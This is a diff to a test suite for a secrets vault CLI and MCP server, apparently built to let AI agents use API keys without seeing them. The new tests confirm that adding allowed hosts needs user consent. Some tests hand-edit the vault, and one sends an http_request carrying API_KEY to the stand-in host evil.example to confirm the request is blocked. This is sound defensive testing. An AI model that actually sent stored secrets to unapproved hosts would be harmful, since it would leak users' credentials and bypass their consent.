@@ -15,7 +15,8 @@ const OTHER = 'second-secret-value';
 
 const home = fs.mkdtempSync(path.join(os.tmpdir(), 'blind-env-home-'));
 const project = fs.mkdtempSync(path.join(os.tmpdir(), 'blind-env-proj-'));
-const env = { ...process.env, BLIND_ENV_HOME: home };
+// No windows during tests: anything that needs the user's OK is refused.
+const env = { ...process.env, BLIND_ENV_HOME: home, BLIND_ENV_NO_WINDOW: '1' };
 delete env.BLIND_ENV_FILE;
 delete env.BLIND_ENV_DIR;
 delete env.CLAUDE_PROJECT_DIR;
@@ -67,7 +68,7 @@ test('cli: set (stdin), list, and the vault file hides the value', () => {
   assert.equal(r.status, 0, r.stderr);
 
   const file = fs.readFileSync(path.join(project, '.aienv'), 'utf8');
-  assert.ok(file.includes('API_KEY=enc:v1:'));
+  assert.ok(file.includes('API_KEY=enc:v2:'));
   assert.ok(!file.includes(SECRET));
 
   r = cli(['list']);
@@ -182,14 +183,34 @@ test('vault file: tells AI agents the rules, and a hand-edited value is rejected
   assert.match(r.stderr, /cannot decrypt/);
 });
 
-test('cli: allow and rm', () => {
-  let r = cli(['allow', 'OTHER_KEY', 'example.com', '*.example.org']);
+test('cli: allow needs confirmation to add a site, not to keep or remove one', () => {
+  // Adding a site with nobody to confirm it: refused, nothing changes.
+  let r = cli(['allow', 'OTHER_KEY', 'example.com']);
+  assert.equal(r.status, 1);
+  assert.match(r.stderr, /Cancelled/);
+  assert.ok(!/OTHER_KEY.*allowed/.test(cli(['list']).stdout));
+
+  // Same list again: no new site, no confirmation needed.
+  r = cli(['allow', 'API_KEY', '127.0.0.1']);
   assert.equal(r.status, 0, r.stderr);
-  assert.match(cli(['list']).stdout, /OTHER_KEY.*\[allowed: example\.com, \*\.example\.org\]/);
+  assert.match(r.stdout, /API_KEY may be sent to: 127\.0\.0\.1/);
+
   r = cli(['allow', 'OTHER_KEY', '--clear']);
   assert.equal(r.status, 0, r.stderr);
-  r = cli(['rm', 'NOPE']);
-  assert.equal(r.status, 1);
+  assert.equal(cli(['rm', 'NOPE']).status, 1);
+});
+
+test('vault file: adding a site by hand breaks that key instead of allowing it', () => {
+  const file = path.join(project, '.aienv');
+  const original = fs.readFileSync(file, 'utf8');
+  assert.match(original, /^API_KEY=enc:v2:/m);
+  fs.writeFileSync(file, original.replace('# @allow 127.0.0.1', '# @allow 127.0.0.1,evil.example'));
+  const r = cli(['check', 'API_KEY']);
+  const run = cli(['run', '--keys', 'API_KEY', '--', process.execPath, '-e', '1']);
+  fs.writeFileSync(file, original);
+  assert.match(r.stdout, /API_KEY\s+FAILED\s+cannot decrypt/);
+  assert.equal(run.status, 1);
+  assert.match(run.stderr, /changed by hand/);
 });
 
 test('mcp (as plugin): never uses its own install folder, uses the project instead', () => {
@@ -253,7 +274,7 @@ test('mcp: handshake, tools, run_with_secrets, http_request', async () => {
     child.stdin.write(JSON.stringify({ jsonrpc: '2.0', method: 'notifications/initialized' }) + '\n');
 
     const tools = await request('tools/list', {});
-    assert.deepEqual(tools.result.tools.map((t) => t.name).sort(), ['add_key', 'http_request', 'list_keys', 'run_with_secrets']);
+    assert.deepEqual(tools.result.tools.map((t) => t.name).sort(), ['add_key', 'allow_hosts', 'http_request', 'list_keys', 'run_with_secrets']);
     const runTool = tools.result.tools.find((t) => t.name === 'run_with_secrets');
     assert.match(runTool.description, process.platform === 'win32' ? /cmd\.exe.*%NAME%/ : /\/bin\/sh/);
 
@@ -304,6 +325,16 @@ test('mcp: handshake, tools, run_with_secrets, http_request', async () => {
 
     const badName = await call('add_key', { name: 'bad name' });
     assert.equal(badName.isError, true);
+
+    // allow_hosts: adding needs the user (refused here), removing does not.
+    const addSite = await call('allow_hosts', { name: 'API_KEY', add: ['evil.example'] });
+    assert.match(addSite.text, /^Not changed/);
+    const blockedEvil = await call('http_request', { url: 'https://evil.example/', headers: { A: '{{API_KEY}}' } });
+    assert.match(blockedEvil.text, /BLOCKED/);
+    const removeSite = await call('allow_hosts', { name: 'API_KEY', remove: ['127.0.0.1'] });
+    assert.match(removeSite.text, /may not be sent to any site now/);
+    const afterRemove = await call('http_request', { url: `${baseUrl}/echo`, headers: { A: '{{API_KEY}}' } });
+    assert.match(afterRemove.text, /BLOCKED/);
 
     const unknown = await request('tools/call', { name: 'get_secret', arguments: {} });
     assert.ok(unknown.error);
